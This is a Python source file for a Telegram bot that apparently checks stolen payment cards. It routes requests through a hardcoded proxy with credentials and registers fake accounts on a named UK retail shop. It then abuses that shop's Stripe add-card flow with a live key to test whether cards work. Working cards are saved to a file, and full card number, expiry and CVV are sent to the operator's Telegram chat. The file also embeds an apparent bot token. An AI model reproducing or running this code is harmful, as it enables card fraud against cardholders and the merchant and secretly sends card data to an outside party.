import aiohttp
import asyncio
import random
import string
from datetime import datetime
from aiohttp_socks import ProxyConnector
import os
import json
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
import logging

# Configure logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Bot configuration
BOT_TOKEN = os.getenv('BOT_TOKEN', '8411567693:AAE7Yqpy4u9YZqZL5DT3-hb0NZgLqTfnFEL0')
ADMIN_ID = os.getenv('ADMIN_ID', '1409419332')

# Store user sessions
user_sessions = {}

def parseX(data, start, end):
    try:
        star = data.index(start) + len(start)
        last = data.index(end, star)
        return data[star:last]
    except ValueError:
        return "None"

def generate_random_email():
    domains = ["gmail.com", "yahoo.com", "hotmail.com", "outlook.com", "aol.com"]
    letters = string.ascii_lowercase
    username = "".join(random.choice(letters) for i in range(10))
    domain = random.choice(domains)
    return f"{username}@{domain}"

async def get_bin_details(cc_number):
    """Fetch BIN details from AntiPublic API"""
    bin_number = cc_number[:6]
    url = f"https://bins.antipublic.cc/bins/{bin_number}"
    
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(url) as response:
                if response.status == 200:
                    data = await response.json()
                    return data
                else:
                    logger.error(f"BIN API returned status: {response.status}")
                    return None
    except Exception as e:
        logger.error(f"BIN API error: {e}")
        return None

async def send_telegram_alert(card_data, bin_details, user_info=""):
    """Send success notification to Telegram"""
    cc, mon, year, cvv = card_data.split('|')[:4]
    
    # Extract BIN information
    if bin_details and 'bin' in bin_details:
        bin_info = bin_details['bin']
        bank = bin_info.get('bank', {}).get('name', 'Unknown Bank')
        country = bin_info.get('country', {}).get('name', 'Unknown Country')
        country_emoji = bin_info.get('country', {}).get('emoji', '🇺🇳')
        brand = bin_info.get('brand', 'Unknown')
        type_ = bin_info.get('type', 'Unknown')
        level = bin_info.get('level', 'Unknown')
        
        card_info = f"{brand} - {type_} - {level}"
    else:
        bank = "Unknown Bank"
        country = "Unknown Country"
        country_emoji = "🇺🇳"
        card_info = "Unknown - Unknown - Unknown"
    
    # Format the message
    message = f"""
#Stripe_Auth HQ 🌩 
━━━━━━━━━━━━━
𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅

[ϟ] 𝗖𝗖 -» <code>{cc}|{mon}|{year}|{cvv}</code>
[ϟ] 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 -» CC Live ✅
[ϟ] 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 -» Stripe Auth

[ϟ] 𝗕𝗮𝗻𝗸 -» {bank}
[ϟ] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 -» {country} {country_emoji}
[ϟ] 𝗜𝗻𝗳𝗼 -» {card_info}

[ϟ] 𝗨𝘀𝗲𝗿 -» {user_info}
━━━━━━━━━━━━━
Dev By : @yuuii_chi 🌪
    """
    
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    
    payload = {
        "chat_id": ADMIN_ID,
        "text": message,
        "parse_mode": "HTML",
        "disable_web_page_preview": True
    }
    
    try:
        async with aiohttp.ClientSession() as session:
            async with session.post(url, json=payload) as response:
                if response.status == 200:
                    logger.info("Telegram notification sent successfully!")
                    return True
                else:
                    error_text = await response.text()
                    logger.error(f"Failed to send Telegram notification: {response.status} - {error_text}")
                    return False
    except Exception as e:
        logger.error(f"Telegram error: {e}")
        return False

async def make_request(session, url, method="POST", params=None, headers=None, data=None, json=None):
    try:
        async with session.request(method, url, params=params, headers=headers, data=data, json=json) as response:
            return await response.text()
    except Exception as e:
        logger.error(f"Request error: {e}")
        return None

async def process_single_card(card_data, user_info=""):
    """Process a single credit card"""
    cc, mon, year, cvv = card_data.split('|')[:4]
    year = year[-2:] if len(year) == 4 else year
    
    logger.info(f"Processing card: {cc}|{mon}|{year}|{cvv}")

    # Proxy configuration
    proxy_url = "http://89565483-zone-custom:M5o5HIxR@na.proxys5.net:6200"
    connector = ProxyConnector.from_url(proxy_url)

    async with aiohttp.ClientSession(connector=connector, trust_env=True) as session:
        headers = {
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "accept-language": "en-US,en;q=0.9",
            "cache-control": "no-cache",
            "pragma": "no-cache",
            "priority": "u=0, i",
            "sec-ch-ua": '"Chromium";v="140", "Not=A?Brand";v="24", "Google Chrome";v="140"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "document",
            "sec-fetch-mode": "navigate",
            "sec-fetch-site": "none",
            "sec-fetch-user": "?1",
            "upgrade-insecure-requests": "1",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36",
        }

        # Step 1: Get account page
        req = await make_request(session, url="https://www.georgedaviesturf.co.uk/my-account", method="GET", headers=headers)
        
        if req is None:
            return "❌ Failed to connect to website"
        
        await asyncio.sleep(1)
        nonce = parseX(req, 'name="woocommerce-register-nonce" value="', '"')
        logger.info(f"Register Nonce: {nonce}")

        # Step 2: Register account
        headers2 = headers.copy()
        headers2.update({
            "content-type": "application/x-www-form-urlencoded",
            "origin": "https://www.georgedaviesturf.co.uk",
            "referer": "https://www.georgedaviesturf.co.uk/my-account",
        })
        
        current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        data2 = {
            "email": generate_random_email(),
            "wc_order_attribution_source_type": "typein",
            "wc_order_attribution_referrer": "(none)",
            "wc_order_attribution_utm_campaign": "(none)",
            "wc_order_attribution_utm_source": "(direct)",
            "wc_order_attribution_utm_medium": "(none)",
            "wc_order_attribution_utm_content": "(none)",
            "wc_order_attribution_utm_id": "(none)",
            "wc_order_attribution_utm_term": "(none)",
            "wc_order_attribution_utm_source_platform": "(none)",
            "wc_order_attribution_utm_creative_format": "(none)",
            "wc_order_attribution_utm_marketing_tactic": "(none)",
            "wc_order_attribution_session_entry": "https://www.georgedaviesturf.co.uk/my-account",
            "wc_order_attribution_session_start_time": f"{current_time}",
            "wc_order_attribution_session_pages": "1",
            "wc_order_attribution_session_count": "1",
            "wc_order_attribution_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
            "woocommerce-register-nonce": nonce,
            "_wp_http_referer": "/my-account/",
            "register": "Register",
        }

        req2 = await make_request(session, "https://www.georgedaviesturf.co.uk/my-account/", headers=headers2, data=data2)
        
        if req2 is None:
            return "❌ Failed to register account"
        
        await asyncio.sleep(1)
        logger.info("Account registered successfully")

        # Step 3: Get payment method page
        req3 = await make_request(session, url="https://www.georgedaviesturf.co.uk/my-account/add-payment-method/", method="GET", headers=headers)
        
        if req3 is None:
            return "❌ Failed to load payment method page"
        
        await asyncio.sleep(2)
        addpmnonce = parseX(req3, 'name="woocommerce-add-payment-method-nonce" value="', '"')
        rest_nonce = parseX(req3, '"createAndConfirmSetupIntentNonce":"', '"')
        logger.info("Payment nonces acquired")

        # Step 4: Create payment method with Stripe
        headers4 = {
            "accept": "application/json",
            "accept-language": "en-US,en;q=0.9",
            "cache-control": "no-cache",
            "content-type": "application/x-www-form/x-www-form-urlencoded",
            "origin": "https://js.stripe.com",
            "pragma": "no-cache",
            "priority": "u=1, i",
            "referer": "https://js.stripe.com/",
            "sec-ch-ua": '"Chromium";v="140", "Not=A?Brand";v="24", "Google Chrome";v="140"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36",
        }

        # Convert to form data format
        form_data = {
            "type": "card",
            "card[number]": cc,
            "card[cvc]": cvv,
            "card[exp_year]": year,
            "card[exp_month]": mon,
            "allow_redisplay": "unspecified",
            "billing_details[address][postal_code]": "99501",
            "billing_details[address][country]": "US",
            "pasted_fields": "number",
            "key": "pk_live_51OCKXEAPMeRp4YIca4hWzwyYQnAllzcTDlBQ76zKfkErhZEyh5aOPCLixfOnAt1oV31EfTX2CGTu40JVnrLvQL7r0078s5MPx5",
        }
        
        req4 = await make_request(session, url="https://api.stripe.com/v1/payment_methods", headers=headers4, data=form_data)
        
        if req4 is None:
            return "❌ Failed to create payment method"
        
        pmid = parseX(req4, '"id": "', '"')
        if pmid == "None":
            return "❌ Failed to get payment method ID"
        
        logger.info(f"Payment Method ID: {pmid}")

        # Step 5: Confirm setup intent
        headers5 = {
            "accept": "*/*",
            "accept-language": "en-US,en;q=0.9",
            "cache-control": "no-cache",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "origin": "https://www.georgedaviesturf.co.uk",
            "pragma": "no-cache",
            "priority": "u=1, i",
            "referer": "https://www.georgedaviesturf.co.uk/my-account/add-payment-method",
            "sec-ch-ua": '"Chromium";v="140", "Not=A?Brand";v="24", "Google Chrome";v="140"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36",
            "x-requested-with": "XMLHttpRequest",
        }
        
        data5 = {
            "action": "wc_stripe_create_and_confirm_setup_intent",
            "wc-stripe-payment-method": pmid,
            "wc-stripe-payment-type": "card",
            "_ajax_nonce": rest_nonce,
        }
        
        req5 = await make_request(session, url="https://www.georgedaviesturf.co.uk/wp-admin/admin-ajax.php", headers=headers5, data=data5)

        if req5 is None:
            return "❌ Failed to confirm setup intent"

        if "succeeded" in req5:
            # Get BIN details and send Telegram alert
            bin_details = await get_bin_details(cc)
            
            # Save successful card
            with open("success_cards.txt", "a") as f:
                f.write(f"{card_data} | {datetime.now()}\n")
            
            # Send alert
            await send_telegram_alert(card_data, bin_details, user_info)
            
            return "✅ **APPROVED** - Card added successfully!"
            
        elif "requires_action" in req5:
            return "⚠️ **3DS REQUIRED** - Stripe 3DS2 Authentication Required"
            
        elif "error" in req5:
            error_resp = parseX(req5, '"message":"', '"')
            return f"❌ **DECLINED** - {error_resp}"
            
        else:
            return "❌ **FAILED** - Unknown error occurred"

async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /start command"""
    user_id = update.effective_user.id
    welcome_text = """
🤖 **Stripe Auth Checker Bot**

Send me a credit card in the format:
`cc_number|mm|yyyy|cvv`

Example:
`4111111111111111|12|2025|123`

I'll check the card against Stripe Auth and notify you of the results.

🔒 *This bot is for educational purposes only*
    """
    
    await update.message.reply_text(welcome_text, parse_mode='Markdown')

async def handle_cc_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle CC messages"""
    user_id = update.effective_user.id
    message_text = update.message.text
    
    # Validate CC format
    if not validate_cc_format(message_text):
        await update.message.reply_text(
            "❌ **Invalid Format**\n\n"
            "Please send CC in format:\n"
            "`cc_number|mm|yyyy|cvv`\n\n"
            "Example: `4111111111111111|12|2025|123`",
            parse_mode='Markdown'
        )
        return
    
    # Send processing message
    processing_msg = await update.message.reply_text("🔄 Processing your card...")
    
    # Process the card
    user_info = f"@{update.effective_user.username}" if update.effective_user.username else f"UserID: {user_id}"
    result = await process_single_card(message_text, user_info)
    
    # Update the message with result
    await context.bot.edit_message_text(
        chat_id=update.effective_chat.id,
        message_id=processing_msg.message_id,
        text=result,
        parse_mode='Markdown'
    )

def validate_cc_format(cc_text):
    """Validate CC format"""
    try:
        parts = cc_text.split('|')
        if len(parts) < 4:
            return False
        
        cc, mon, year, cvv = parts[:4]
        
        # Basic validation
        if not cc.isdigit() or len(cc) < 13 or len(cc) > 19:
            return False
        
        if not mon.isdigit() or not (1 <= int(mon) <= 12):
            return False
            
        if not year.isdigit() or len(year) not in [2, 4]:
            return False
            
        if not cvv.isdigit() or len(cvv) not in [3, 4]:
            return False
            
        return True
    except:
        return False

async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle errors"""
    logger.error(f"Error: {context.error}")
    
    if update and update.effective_message:
        await update.effective_message.reply_text(
            "❌ An error occurred. Please try again later."
        )

def main():
    """Start the bot"""
    # Check if required packages are installed
    try:
        import aiohttp_socks
    except ImportError:
        logger.error("aiohttp-socks not installed. Please install required packages.")
        return
    
    # Create application
    application = Application.builder().token(BOT_TOKEN).build()
    
    # Add handlers
    application.add_handler(CommandHandler("start", start_command))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_cc_message))
    application.add_error_handler(error_handler)
    
    # Start the bot
    logger.info("Bot is starting...")
    application.run_polling()

if __name__ == "__main__":
    main()
